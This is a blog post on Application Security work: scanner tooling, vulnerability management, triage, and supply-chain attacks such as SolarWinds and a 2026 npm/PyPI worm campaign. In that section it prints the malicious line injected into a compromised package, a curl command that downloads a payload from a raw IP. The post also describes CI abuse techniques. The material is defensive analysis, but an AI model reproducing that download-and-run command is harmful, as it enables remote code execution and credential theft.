---
title: AppSec is not running the scanner. It's everything after.
date: 2026-08-20
tags: [appsec, devsecops, supply-chain, sdlc]
summary: What an Application Security engineer actually does across the SDLC — which tools cover which stage, how a vulnerability management platform turns their output into numbers you can defend in a board meeting, why triage is the real job, and how the software supply chain went from a footnote to the main threat between SolarWinds and the Mistral AI SDK compromise.
---

The job is easy to describe badly. "Application Security engineer: runs security
tools on the code." That description is technically true and completely useless,
in the same way "firefighter: operates a hose" is true.

Buying scanners is a purchase order. Turning their output into fixed code, in a
codebase you don't own, written by people who have their own roadmap and did not
ask for your opinion, is the job. **The tooling produces findings. AppSec
produces decisions.**

Here is what that looks like across a development lifecycle, what each tool is
actually good at, why triage eats most of the week, and why the interesting half
of the threat model moved out of your repository entirely.

## Where in the SDLC AppSec shows up

Not everywhere at once, and not with equal weight. The cost of a fix rises with
each stage it survives, so the effort is deliberately front-loaded:

| Stage | What AppSec does | Typical tooling |
| --- | --- | --- |
| Design | Threat modelling, auth boundaries, "where does the untrusted data enter" | Whiteboard, STRIDE, a real conversation |
| Code | Static analysis, secret detection, dependency review on the pull request | SAST, secret scanners, SCA |
| Build | Pipeline hardening, artifact provenance, image scanning | SLSA/attestations, container scanners, `zizmor` |
| Deploy | Infrastructure-as-code review, config drift, exposed surface | IaC scanners, policy-as-code |
| Run | Black-box testing, bug bounty triage, incident support | DAST, WAF telemetry, runtime detection |
| All of them | Aggregating every scanner's output, tracking state, reporting | DefectDojo, GitLab Ultimate |

<figure class="diagram">
<svg viewBox="0 0 720 214" role="img" aria-labelledby="fig1t">
  <title id="fig1t">The five SDLC stages, the tooling that covers each one, and the vulnerability management layer that aggregates all of them.</title>
  <defs><marker id="a1" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <rect class="d-box" x="8"   y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="148" y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="288" y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="428" y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="568" y="16" width="120" height="36" rx="4"/>
  <text class="d-t d-b" x="68"  y="39" text-anchor="middle">design</text>
  <text class="d-t d-b" x="208" y="39" text-anchor="middle">code</text>
  <text class="d-t d-b" x="348" y="39" text-anchor="middle">build</text>
  <text class="d-t d-b" x="488" y="39" text-anchor="middle">deploy</text>
  <text class="d-t d-b" x="628" y="39" text-anchor="middle">run</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a1)">
    <path d="M130,34 H145"/><path d="M270,34 H285"/>
    <path d="M410,34 H425"/><path d="M550,34 H565"/>
  </g>
  <text class="d-m" x="68"  y="70" text-anchor="middle">threat model</text>
  <text class="d-m" x="68"  y="84" text-anchor="middle">trust boundaries</text>
  <text class="d-m" x="208" y="70" text-anchor="middle">SAST</text>
  <text class="d-m" x="208" y="84" text-anchor="middle">secret detection</text>
  <text class="d-m" x="208" y="98" text-anchor="middle">SCA</text>
  <text class="d-m" x="348" y="70" text-anchor="middle">provenance</text>
  <text class="d-m" x="348" y="84" text-anchor="middle">image scanning</text>
  <text class="d-m" x="348" y="98" text-anchor="middle">workflow linting</text>
  <text class="d-m" x="488" y="70" text-anchor="middle">IaC scanning</text>
  <text class="d-m" x="488" y="84" text-anchor="middle">policy as code</text>
  <text class="d-m" x="628" y="70" text-anchor="middle">DAST</text>
  <text class="d-m" x="628" y="84" text-anchor="middle">runtime detection</text>
  <g class="d-dash">
    <path d="M68,108  V126"/><path d="M208,108 V126"/><path d="M348,108 V126"/>
    <path d="M488,108 V126"/><path d="M628,108 V126"/>
  </g>
  <rect class="d-box-a" x="8" y="126" width="680" height="44" rx="4"/>
  <text class="d-a d-b" x="348" y="145" text-anchor="middle">vulnerability management</text>
  <text class="d-m"     x="348" y="161" text-anchor="middle">DefectDojo · GitLab Ultimate — dedup, state, ownership, trend</text>
  <polygon class="d-fill" points="8,208 688,198 688,208" opacity="0.5"/>
  <text class="d-m" x="8"   y="192">cheap to fix here</text>
  <text class="d-m" x="688" y="192" text-anchor="end">…and orders of magnitude more expensive here</text>
</svg>
<figcaption>Every stage has tooling; only the design stage doesn't, and that's the one where decisions are cheapest to change. The aggregation layer spans all five, which is what makes the numbers in the next section comparable.</figcaption>
</figure>

The design stage has the worst tooling and the highest leverage. An
authorization model that was wrong on the whiteboard produces a hundred SAST
findings six months later, none of which say "the authorization model is wrong."
No scanner has ever found a missing tenant check that the code implements
consistently and incorrectly everywhere.

That is the first thing to internalise about the role: **the tools cover the
classes of bug that generalise, and you cover the ones that don't.**

## The toolbox, and what each tool is actually blind to

Every category below is worth having. Every one of them has a failure mode that
determines how you should read its output.

**SAST** — static analysis, reads the code without running it. Good at
taint-tracking: user input reaching a SQL string, a shell call, a deserializer.
Blind to anything that depends on runtime state. It does not know that the
endpoint is behind an admin-only gateway, so it will report the same injection
in a public handler and in an internal migration script with identical severity.
Its false-positive rate is the entire reason triage exists.

**SCA** — software composition analysis, matches your dependency tree against
vulnerability databases. Good at "you ship `log4j-core 2.14.1` and you should
not." Blind in two directions at once: it flags CVEs in code paths you never
call, and it says nothing at all about a malicious package, because malware does
not get a CVE before it is published. Hold on to that second point — it is the
whole reason the last section of this post exists.

**Secret detection** — regex and entropy over source, history and build output.
Cheap, high signal, and the one control I would keep if I could only keep one.
The catch is that finding a secret is 10% of the work: the finding is a *leak*,
not a *bug*, and the fix is rotation, not a commit. A key removed from the code
and left valid in production is a ticket closed and a risk untouched.

**DAST** — dynamic testing against a running instance. Sees what actually
responds on the wire, which is the only tool in the list that can confirm
exploitability rather than infer it. Correspondingly slow, needs a real
environment with real auth, and only reaches what it can crawl. Everything
behind a multi-step business flow is invisible to it.

**IaC and pipeline scanning** — Terraform, Kubernetes manifests, GitHub Actions
workflows. The workflows deserve specific attention: a workflow with write
permissions on a token is production code with a shell in it, and it is almost
never reviewed like production code.

None of these categories replaces the others, and each one speaks its own
dialect: different severity scales, different identifiers, different output
formats, no shared notion of whether two findings are the same finding. Stacked
without somewhere to land, they multiply noise rather than coverage.

## Vulnerability management: the layer that makes it all countable

The moment you run more than two scanners, the bottleneck stops being detection
and becomes bookkeeping. Six tools across forty repositories, each with its own
dashboard, is not a security programme — it's six backlogs nobody owns, and no
way to answer "are we getting better?"

The fix is a vulnerability management platform: **DefectDojo** for example if you want the
open-source route, **GitLab Ultimate** (again something I have been working with but you have other tools too) if your organisation already lives there
and you want the findings to land in the merge request. Others exist and the
category matters more than the product. Everything ingests scanner output — most
tools emit SARIF or a native format the platform already parses — and the
platform becomes the single place where a finding has a state.

What you get out of it that you cannot get from the individual tools:

- **Deduplication.** The same hardcoded key found by the secret scanner, the
  SAST engine and the container scanner is one problem, not three. Without
  dedup, your numbers are inflated by however many tools you bought.
- **Persistent state across scans.** A finding you triaged as a false positive
  in March stays triaged in April. This is the property that makes suppression
  discipline survive contact with a nightly pipeline — otherwise every scan
  resurrects every decision you already made.
- **Ownership and lifecycle.** Each finding has a team, a severity you assigned
  rather than the one the tool guessed, a due date, and a status. It syncs to
  Jira or GitLab issues so the developers work in their own tracker.
- **Coverage visibility.** Which repositories are scanned by what. The gap you
  can't see is worse than the findings you can — an unscanned service is a zero
  in every report, and a zero looks like good news.
- **History.** Which is the whole point of the next part.

<figure class="diagram">
<svg viewBox="0 0 720 252" role="img" aria-labelledby="fig3t">
  <title id="fig3t">Five scanners feeding one vulnerability management platform, which produces two different sets of metrics: operational ones for engineering and risk ones for management.</title>
  <defs><marker id="a3" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <rect class="d-box" x="8" y="24"  width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="62"  width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="100" width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="138" width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="176" width="118" height="26" rx="4"/>
  <text class="d-m" x="67" y="41"  text-anchor="middle">SAST</text>
  <text class="d-m" x="67" y="79"  text-anchor="middle">SCA</text>
  <text class="d-m" x="67" y="117" text-anchor="middle">secret detection</text>
  <text class="d-m" x="67" y="155" text-anchor="middle">DAST</text>
  <text class="d-m" x="67" y="193" text-anchor="middle">IaC / pipeline</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a3)">
    <path d="M128,37  C152,37 156,100 174,104"/>
    <path d="M128,75  C152,75 156,110 174,112"/>
    <path d="M128,113 H174"/>
    <path d="M128,151 C152,151 156,124 174,120"/>
    <path d="M128,189 C152,189 156,132 174,128"/>
  </g>
  <rect class="d-box-a" x="176" y="60" width="150" height="130" rx="4"/>
  <text class="d-a d-b" x="251" y="102" text-anchor="middle">vulnerability</text>
  <text class="d-a d-b" x="251" y="118" text-anchor="middle">management</text>
  <text class="d-m"     x="251" y="142" text-anchor="middle">dedup · state</text>
  <text class="d-m"     x="251" y="156" text-anchor="middle">owner · history</text>
  <g class="d-arrow-a" color="var(--accent)" marker-end="url(#a3)">
    <path d="M328,110 C350,110 352,86 372,86"/>
    <path d="M328,140 C350,140 352,188 372,188"/>
  </g>
  <rect class="d-box" x="374" y="42" width="338" height="88" rx="4"/>
  <text class="d-t d-b" x="390" y="62">to engineers</text>
  <text class="d-m" x="390" y="82">open findings per team and per service</text>
  <text class="d-m" x="390" y="98">mean time to remediate, by severity</text>
  <text class="d-m" x="390" y="114">introduction rate vs. remediation rate</text>
  <rect class="d-box" x="374" y="144" width="338" height="104" rx="4"/>
  <text class="d-t d-b" x="390" y="164">to management, risk and audit</text>
  <text class="d-m" x="390" y="184">scanner coverage as % of the estate</text>
  <text class="d-m" x="390" y="200">exposure on internet-facing services</text>
  <text class="d-m" x="390" y="216">quarter-over-quarter trend, one line</text>
  <text class="d-m" x="390" y="232">evidence for ISO 27001 / SOC 2 / PCI</text>
</svg>
<figcaption>Same data, two vocabularies. The platform exists so that the left-hand column can grow another scanner without the right-hand column changing shape — which is exactly why raw finding counts are the wrong thing to report.</figcaption>
</figure>

### Numbers that mean something to each audience

This is where the platform earns its keep, because the two conversations you
need to have are completely different.

**To engineers and engineering managers**, the useful metrics are operational:

- open findings by severity **per team and per service**, trended over time
- **mean time to remediate**, split by severity — this is the number that tells
  you whether the process works
- **introduction vs. remediation rate**: are we closing faster than we open? A
  flat backlog with high throughput is a healthy team; a growing backlog is a
  resourcing conversation, not a nagging one
- age distribution of the backlog, and how many findings are past their agreed
  due date

**To management, risk, and audit**, none of that lands. They need:

- **scanner coverage as a percentage of the estate**, because that is a
  maturity statement they can act on with budget
- **exposure concentrated where it matters** — critical findings on
  internet-facing or data-handling services, not a global count
- **trend**, in one line: "critical findings aged over 30 days went from 40 to
  6 this quarter". Direction beats absolute value every time
- **evidence for compliance**. ISO 27001, SOC 2, PCI DSS and now CRA all ask
  some version of "show me that you find and fix vulnerabilities on a defined
  timeline". A vulnerability management platform answers that with an export
  instead of a fortnight of screenshots.

Two warnings from experience. First, **do not report raw finding counts** to
anyone. The number goes up when you add a scanner and down when you remove one,
which means it measures your tooling budget rather than your risk, and it
punishes exactly the teams doing the most work. Trend and time-to-remediate are
the honest metrics.

Second, **never let the metric become the goal**. "Close 90% of criticals this
quarter" reliably produces reclassification rather than fixes. Measure the
process, negotiate the risk.

The platform is also what turns triage from a task into a workflow — which is
the part of the job that actually consumes the week.

## Triage: turning findings into a decision

A first scan on a mature codebase returns hundreds or thousands of findings. If
you forward them to the team as-is, you have not done security work — you have
done a denial of service on the people you needed as allies, and you will never
get their attention back.

Triage is answering four questions per finding, in this order, and stopping at
the first "no":

1. **Is it real?** Does the sink the tool flagged actually exist, and does the
   data really reach it? A large slice of SAST output dies here.
2. **Is it reachable?** Is the code path invoked in a deployed configuration, by
   a caller who is not already fully trusted?
3. **What does it get the attacker?** SQL injection on a read-only table of
   public reference data is not SQL injection on the users table.
4. **What does the fix cost?** A one-line parameterised query and an
   authorization redesign are the same severity and completely different tickets.

<figure class="diagram">
<svg viewBox="0 0 720 204" role="img" aria-labelledby="fig2t">
  <title id="fig2t">A triage funnel narrowing from 2,412 raw scanner findings to 23 tickets.</title>
  <text class="d-m" x="246" y="39"  text-anchor="end">raw scanner output</text>
  <text class="d-m" x="246" y="75"  text-anchor="end">after deduplication</text>
  <text class="d-m" x="246" y="111" text-anchor="end">1. real — the sink exists</text>
  <text class="d-m" x="246" y="147" text-anchor="end">2. reachable in production</text>
  <text class="d-m" x="246" y="183" text-anchor="end">3–4. impact worth the fix cost</text>
  <rect class="d-box"  x="258" y="24"  width="380" height="22" rx="3"/>
  <rect class="d-box"  x="258" y="60"  width="262" height="22" rx="3"/>
  <rect class="d-box"  x="258" y="96"  width="140" height="22" rx="3"/>
  <rect class="d-box"  x="258" y="132" width="70"  height="22" rx="3"/>
  <rect class="d-fill" x="258" y="168" width="33"  height="22" rx="3"/>
  <text class="d-m"    x="646" y="39"  >2,412</text>
  <text class="d-m"    x="528" y="75"  >1,180</text>
  <text class="d-m"    x="406" y="111" >310</text>
  <text class="d-m"    x="336" y="147" >96</text>
  <text class="d-a d-b" x="299" y="183">23 tickets</text>
  <path class="d-dash" d="M258,20 V196"/>
</svg>
<figcaption>Illustrative shape, not real data — but the order of magnitude is right. The 2,389 findings that fall out are suppressed with a written reason and keep that state on the next scan; they are not deleted, and they are never sent to a developer.</figcaption>
</figure>

Only findings that survive all four become work. Everything else gets suppressed
*with a written reason*, because an unexplained suppression is indistinguishable
from a mistake six months later when someone re-runs the scan.

Suppression discipline is what keeps the whole thing alive. The target state is
a clean pipeline where any new finding means something changed. A backlog of
4,000 permanently-red findings trains everyone, including you, to stop reading
the output — and that is strictly worse than not having the scanner, because it
comes with the illusion of coverage.

Some heuristics that hold up:

- **Rank by exploitability, not by CVSS.** The score was assigned by someone who
  has never seen your architecture.
- **A reachable medium beats an unreachable critical.** Every time.
- **Group findings into a root cause.** Forty findings from one unsafe template
  helper is one fix and one conversation, not forty tickets.
- **Rotate first, fix second, on anything secret-shaped.** The credential is
  live from the moment it's committed, not from the moment you notice.

## The meeting is the deliverable

The other half of the role is a recurring technical meeting with each
development team, and it is not a status report. Its purpose is to convert your
triaged list into *their* prioritised backlog — with their input, because they
know things you don't.

What tends to work:

- **Bring the exploit, not the finding.** "Here is a request that returns
  another tenant's invoice" ends the debate that "SAST reports an IDOR" starts.
- **Come with the fix, or at least the shape of it.** A patch, a safe helper
  they can reuse, a link to the pattern they already use correctly elsewhere.
- **Bring their context.** Their service handles payment data, so it is
  first — that is an argument. "It's a critical" is not.
- **Agree on a date, and write it down.** An accepted risk with an owner and an
  expiry is a legitimate outcome. An ignored ticket is not.
- **Kill classes, not instances.** The best result of any of these meetings is a
  linter rule, a wrapper, or a template change that makes the bug unwritable in
  that codebase from now on. Then you never have this meeting again.

The failure mode of the role is becoming the person who forwards scanner emails
and blocks releases. The teams route around that person, usually by finding out
which check can be skipped with a label. **You have no authority to fix anything
in someone else's repository, so the credibility is the toolchain.**

## Then the attackers changed target

Everything above assumes the vulnerability is in code your organisation wrote.
For twenty years that assumption was mostly right, and the industry got
reasonably good at it — memory-safe languages, parameterised queries, frameworks
with escaping on by default. Writing an exploitable app takes more effort than
it used to.

So attackers went one level up. If the code you write is hardened, compromise
the code you *include* — and get every downstream consumer at once. It is the
same economics that made phishing beat cryptanalysis.

### SolarWinds: compromise the build

December 2020. Attackers got into SolarWinds' build environment and inserted a
backdoor into Orion — not into the source repository, but into the build, so
that the compiled artifact contained code no developer had ever committed and no
source review would ever find. It was signed with SolarWinds' legitimate
certificate, because it came off SolarWinds' legitimate build system. Roughly
18,000 customers installed the trojanised update through the normal patch
process they had been told to keep current.

The lesson everyone quoted at the time was "code signing proves the origin, not
the intent." The lesson that mattered more: **your build pipeline is part of
your attack surface, and its output was trusted by everyone downstream without
anyone having a way to verify it.**

That single event is why SBOMs, provenance attestation and reproducible builds
went from academic to procurement requirements.

### Mistral AI: compromise the maintainer

Fast-forward to 11–12 May 2026. In a five-hour window, a threat actor tracked as
TeamPCP published **404 malicious versions across roughly 172 npm packages and 2
PyPI packages** — the campaign researchers named *Mini Shai-Hulud*, the fourth
wave of that family since September 2025. The blast radius included the entire
TanStack router ecosystem, 65 UiPath packages, OpenSearch's client at 1.3M
weekly downloads, Guardrails AI, and Mistral AI's SDK suite on both registries.

The Python side is the clean illustration. `mistralai` 2.4.6 was published on
top of a legitimate 2.4.5, with code injected into
`mistralai/client/__init__.py` — an import-time trigger, which is worth pausing
on:

```python
# roughly what landed in mistralai/client/__init__.py
"curl -k -L -s https://83.142.209.194/transformers.pyz -o /tmp/transformers.pyz"
# ... executed detached, output suppressed
```

Triggering on **import** rather than on install is a deliberate evasion. A
sandboxed `pip install` in a scanning environment never executes it. The payload
fires on the first `import mistralai` — which happens in your CI job, or on a
developer laptop, in an environment that by definition has credentials.

The second stage was a credential stealer: cloud keys, GitHub tokens, SSH keys,
Kubernetes service accounts, Vault tokens, registry publish tokens. It checked
its environment before running, and in some geographies carried a destructive
branch. It exfiltrated over an onion-routed messenger rather than a plain C2,
and on the npm side it *self-replicated* — using stolen GitHub tokens to commit
poisoned IDE and editor configs into the victim's own repositories.

That last property is what makes this generation different from SolarWinds. This
is not one compromised vendor. It is a worm whose propagation medium is
developer credentials, and every stolen publish token is a new starting point.

<figure class="diagram">
<svg viewBox="0 0 720 262" role="img" aria-labelledby="fig4t">
  <title id="fig4t">SolarWinds compromised one vendor's build system to reach 18,000 customers. Mini Shai-Hulud compromised maintainer credentials and CI, and self-replicates using the tokens it steals.</title>
  <defs><marker id="a4" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <text class="d-t d-b" x="8" y="14">2020 · SolarWinds — compromise the build</text>
  <rect class="d-box"   x="8"   y="26" width="130" height="38" rx="4"/>
  <rect class="d-box-a" x="168" y="26" width="150" height="38" rx="4"/>
  <rect class="d-box"   x="348" y="26" width="150" height="38" rx="4"/>
  <rect class="d-box"   x="528" y="26" width="172" height="38" rx="4"/>
  <text class="d-m"     x="73"  y="50" text-anchor="middle">source repo</text>
  <text class="d-a d-b" x="243" y="43" text-anchor="middle">build system</text>
  <text class="d-m"     x="243" y="57" text-anchor="middle">backdoor injected</text>
  <text class="d-m"     x="423" y="43" text-anchor="middle">signed update</text>
  <text class="d-m"     x="423" y="57" text-anchor="middle">valid certificate</text>
  <text class="d-t d-b" x="614" y="43" text-anchor="middle">~18,000 customers</text>
  <text class="d-m"     x="614" y="57" text-anchor="middle">patching as instructed</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a4)">
    <path d="M140,45 H164"/><path d="M320,45 H344"/><path d="M500,45 H524"/>
  </g>
  <text class="d-m" x="8" y="86">One vendor, one build, one direction. Source review would never have found it.</text>
  <path class="d-rule" d="M8,104 H700"/>
  <text class="d-t d-b" x="8" y="130">2026 · Mini Shai-Hulud — compromise the maintainer</text>
  <rect class="d-box-a" x="8"   y="142" width="150" height="38" rx="4"/>
  <rect class="d-box"   x="188" y="142" width="140" height="38" rx="4"/>
  <rect class="d-box"   x="358" y="142" width="140" height="38" rx="4"/>
  <rect class="d-box"   x="528" y="142" width="172" height="38" rx="4"/>
  <text class="d-a d-b" x="83"  y="159" text-anchor="middle">maintainer creds</text>
  <text class="d-m"     x="83"  y="173" text-anchor="middle">+ CI misconfig</text>
  <text class="d-m"     x="258" y="159" text-anchor="middle">release pipeline</text>
  <text class="d-m"     x="258" y="173" text-anchor="middle">trusted, unchanged</text>
  <text class="d-m"     x="428" y="159" text-anchor="middle">npm / PyPI</text>
  <text class="d-m"     x="428" y="173" text-anchor="middle">official accounts</text>
  <text class="d-t d-b" x="614" y="159" text-anchor="middle">404 versions</text>
  <text class="d-m"     x="614" y="173" text-anchor="middle">172 packages, 5 hours</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a4)">
    <path d="M160,161 H184"/><path d="M330,161 H354"/><path d="M500,161 H524"/>
  </g>
  <path class="d-arrow-a" color="var(--accent)" marker-end="url(#a4)"
        d="M614,182 V212 H83 V186"/>
  <text class="d-am" x="348" y="228" text-anchor="middle">every victim's stolen tokens publish the next wave</text>
  <text class="d-m"  x="8"   y="252">Not one compromised vendor — a worm whose propagation medium is developer credentials.</text>
</svg>
<figcaption>Six years apart, the same insight applied one level further up: don't attack the product, attack whatever everyone downstream already trusts. The difference is the feedback arrow — SolarWinds ended at the customer, this one starts again there.</figcaption>
</figure>

### Why your SCA said nothing

Read the detection failure carefully, because it is the whole point:

- The package came from the **official account**, through the **official
  pipeline**.
- Integrity checks **passed** — the hash matched what was published.
- No CVE existed, because the malicious version was newer than every database.
- Version 2.4.6 was a perfectly normal-looking increment over 2.4.5.

SCA compares your tree against a list of known-bad versions. A brand-new
malicious release is not on any list at the moment you install it. **The control
that has protected us from vulnerable dependencies for a decade is structurally
blind to malicious ones**, and no amount of tuning fixes that, because the gap
is in the model, not the configuration.

<figure class="diagram">
<svg viewBox="0 0 720 132" role="img" aria-labelledby="fig5t">
  <title id="fig5t">A timeline showing the window between a malicious package being published and being detected, during which no vulnerability database knows about it.</title>
  <defs><marker id="a5" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <rect class="d-box" x="60" y="40" width="500" height="30" rx="3"/>
  <text class="d-m" x="310" y="59" text-anchor="middle">no database knows — every scanner returns clean</text>
  <g class="d-rule">
    <path d="M60,36 V94"/><path d="M310,70 V94"/><path d="M560,36 V94"/>
  </g>
  <path class="d-arrow" color="var(--muted)" marker-end="url(#a5)" d="M8,86 H700"/>
  <text class="d-t d-b" x="60"  y="30" text-anchor="middle">t₀</text>
  <text class="d-m"     x="60"  y="16" text-anchor="middle">2.4.6 published</text>
  <circle class="d-fill" cx="310" cy="86" r="4.5"/>
  <text class="d-a d-b" x="310" y="110" text-anchor="middle">your CI installs it</text>
  <text class="d-m"     x="310" y="124" text-anchor="middle">integrity check passes · official account · version just increments</text>
  <text class="d-t d-b" x="560" y="30" text-anchor="middle">t₀ + hours to days</text>
  <text class="d-m"     x="560" y="16" text-anchor="middle">detected · CVE · yanked</text>
</svg>
<figcaption>The control that catches vulnerable dependencies works by lookup, so it is empty for exactly as long as the attack is new. A release cooldown moves your install to the right of that third line, which is why it is the cheapest control on the list below.</figcaption>
</figure>

Note also how the access was obtained across this campaign: abused maintainer
credentials, and misconfigured GitHub Actions — `pull_request_target` running
untrusted workflow code with elevated context, cache poisoning, and short-lived
OIDC tokens scraped straight out of runner process memory. Nobody found a bug in
anyone's product. They attacked the publication pipeline, which almost nobody
threat-models, and the maintainers, who are frequently unpaid volunteers with
personal accounts and no security budget.

## What AppSec actually does about it

Supply chain work does not look like the rest of the role. The code you need to review to actually harden your supply chain takes one principle that was tossed around for years: **"Zero-Trust"**.

In this definition, we can apply several actions on the **supply chain** to both **mitigate** and **block** what we or security teams define as *insecure*:

- **Pin exact versions and commit lockfiles**, everywhere, including CI actions
  by commit SHA rather than tag. A floating tag is someone else's write access
  to your pipeline.
- **Impose a cooldown on new releases.** Most malicious versions are detected
  and pulled within hours to days. A policy of "no version younger than N days
  in a build" would have blocked this entire campaign at zero engineering cost.
  It is the single highest-value control in this list.
- **Treat CI as production.** Least-privilege tokens, no `pull_request_target`
  on untrusted input, scoped OIDC, and workflow linting with something like
  `zizmor`. The runner holds credentials to everything.
- **Restrict egress from builds.** A build step that can reach an arbitrary IP
  is a build step that can exfiltrate. Allowlisting your registries breaks the
  second stage even when the first one lands.
- **Require and check provenance.** Attestations and trusted publishing tie an
  artifact to the pipeline that produced it — the direct answer to the
  SolarWinds problem, now widely available and still widely unused.
- **Plan the rotation, in advance.** The remediation for "we imported it" is not
  a version bump. It is rotating every credential that existed in that
  environment, and you want to know how long that takes *before* you need it.
- **Watch behaviour, not just inventory.** Nothing static was going to catch
  2.4.6. A build reaching an unknown IP is a signal that does not depend on any
  vulnerability database being up to date.

## So what is the role, in one paragraph

Application Security is the function that makes secure code the path of least
resistance for everyone else. It shows up early enough in the design to change
the shape of the system, runs the tooling that catches what generalises, absorbs
that tooling's noise so the developers never have to, converts the survivors
into prioritised work in a meeting where it arrives with fixes rather than
demands, keeps the whole thing in one system so that "are we getting better" has
a defensible answer for engineers and for the board, and maintains a live model
of how the code that was never written in-house gets in and what it can reach
when it does.

The scanners are table stakes. **The judgement is the job.**

---

Sources for the supply chain section:
[SafeDep's campaign analysis](https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/),
[Raven's breakdown of the Mistral PyPI compromise](https://raven.io/blog/the-mistral-compromise),
[The Hacker News on Mini Shai-Hulud](https://thehackernews.com/2026/05/mini-shai-hulud-worm-compromises.html),
and [Mistral's own security advisories](https://docs.mistral.ai/resources/security-advisories).
